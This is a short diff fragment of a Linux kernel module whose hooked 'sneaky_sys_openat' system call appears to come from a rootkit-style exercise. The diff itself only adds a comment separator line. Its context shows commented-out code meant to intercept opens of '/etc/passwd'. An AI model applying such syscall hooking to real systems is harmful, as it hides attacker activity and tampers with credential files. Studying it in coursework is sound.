@@ -107,6 +107,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
       }
       printk(KERN_INFO "Sneaky openat is called.\n");
   }
+  //-------------------------------------------------------------
   // const char *pathname = (const char *)regs->si;
   // // Implement the sneaky part here
   // if (strcmp(pathname, "/etc/passwd") == 0) {
